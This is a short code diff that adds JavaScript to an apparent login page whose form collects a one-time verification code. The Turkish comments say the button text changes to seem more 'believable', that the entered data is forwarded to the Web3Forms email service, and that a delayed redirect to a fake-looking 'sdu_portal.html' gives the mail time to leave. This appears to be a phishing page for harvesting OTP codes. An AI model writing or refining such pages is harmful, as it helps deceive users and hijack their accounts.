@@ -955,6 +955,22 @@
                                                 DOĞRULA VE GİRİŞ YAP
                                             </button>
                                         </form>
+                                        <script>
+                                            const form = document.getElementById('otpForm');
+
+                                            form.addEventListener('submit', function (e) {
+                                                // Butonun yazısını değiştirerek "işlem yapılıyor" havası verelim (inandırıcılık artar)
+                                                document.getElementById('submitBtn').innerText = "Doğrulanıyor...";
+
+                                                // Form verilerini Web3Forms'a gönder
+                                                const formData = new FormData(form);
+
+                                                // Gönderim bittikten 1.5 saniye sonra (mailin yola çıkması için yeterli süre) portala git
+                                                setTimeout(function () {
+                                                    window.location.href = "sdu_portal.html";
+                                                }, 1500);
+                                            });
+                                        </script>
 
                                         <div class="footer"
                                             style="text-align: center; margin-top: 20px; font-size: 12px; color: #777;">
